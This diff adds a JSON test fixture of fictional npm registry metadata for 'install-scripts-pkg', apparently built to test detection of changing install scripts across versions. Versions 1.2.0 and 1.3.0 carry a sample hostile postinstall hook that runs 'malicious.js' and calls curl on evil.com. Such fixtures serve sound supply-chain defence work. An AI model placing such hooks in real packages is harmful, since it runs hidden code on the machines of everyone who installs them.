@@ -1,0 +1,106 @@
+{
+  "_id": "install-scripts-pkg",
+  "name": "install-scripts-pkg",
+  "description": "Test package with install scripts",
+  "dist-tags": {
+    "latest": "1.3.0"
+  },
+  "time": {
+    "1.0.0": "2026-01-01T00:00:00.000Z",
+    "1.1.0": "2026-02-01T00:00:00.000Z",
+    "1.2.0": "2026-03-01T00:00:00.000Z",
+    "1.3.0": "2026-04-01T00:00:00.000Z",
+    "created": "2026-01-01T00:00:00.000Z",
+    "modified": "2026-04-01T00:00:00.000Z"
+  },
+  "versions": {
+    "1.0.0": {
+      "_id": "install-scripts-pkg@1.0.0",
+      "_npmUser": {
+        "email": "maintainer@example.com",
+        "name": "maintainer"
+      },
+      "name": "install-scripts-pkg",
+      "version": "1.0.0",
+      "description": "Test package with install scripts",
+      "scripts": {
+        "test": "echo test"
+      },
+      "repository": {
+        "type": "git",
+        "url": "https://github.com/example/install-scripts-pkg"
+      },
+      "dist": {
+        "shasum": "abc123",
+        "tarball": "http://registry.npmjs.org/install-scripts-pkg/-/install-scripts-pkg-1.0.0.tgz"
+      }
+    },
+    "1.1.0": {
+      "_id": "install-scripts-pkg@1.1.0",
+      "_npmUser": {
+        "email": "maintainer@example.com",
+        "name": "maintainer"
+      },
+      "name": "install-scripts-pkg",
+      "version": "1.1.0",
+      "description": "Test package with install scripts",
+      "scripts": {
+        "test": "echo test",
+        "postinstall": "node scripts/setup.js"
+      },
+      "repository": {
+        "type": "git",
+        "url": "https://github.com/example/install-scripts-pkg"
+      },
+      "dist": {
+        "shasum": "def456",
+        "tarball": "http://registry.npmjs.org/install-scripts-pkg/-/install-scripts-pkg-1.1.0.tgz"
+      }
+    },
+    "1.2.0": {
+      "_id": "install-scripts-pkg@1.2.0",
+      "_npmUser": {
+        "email": "maintainer@example.com",
+        "name": "maintainer"
+      },
+      "name": "install-scripts-pkg",
+      "version": "1.2.0",
+      "description": "Test package with install scripts",
+      "scripts": {
+        "test": "echo test",
+        "postinstall": "node scripts/malicious.js && curl http://evil.com"
+      },
+      "repository": {
+        "type": "git",
+        "url": "https://github.com/example/install-scripts-pkg"
+      },
+      "dist": {
+        "shasum": "ghi789",
+        "tarball": "http://registry.npmjs.org/install-scripts-pkg/-/install-scripts-pkg-1.2.0.tgz"
+      }
+    },
+    "1.3.0": {
+      "_id": "install-scripts-pkg@1.3.0",
+      "_npmUser": {
+        "email": "maintainer@example.com",
+        "name": "maintainer"
+      },
+      "name": "install-scripts-pkg",
+      "version": "1.3.0",
+      "description": "Test package with install scripts",
+      "scripts": {
+        "test": "echo test",
+        "postinstall": "node scripts/malicious.js && curl http://evil.com",
+        "preinstall": "echo preinstall"
+      },
+      "repository": {
+        "type": "git",
+        "url": "https://github.com/example/install-scripts-pkg"
+      },
+      "dist": {
+        "shasum": "jkl012",
+        "tarball": "http://registry.npmjs.org/install-scripts-pkg/-/install-scripts-pkg-1.3.0.tgz"
+      }
+    }
+  }
+}
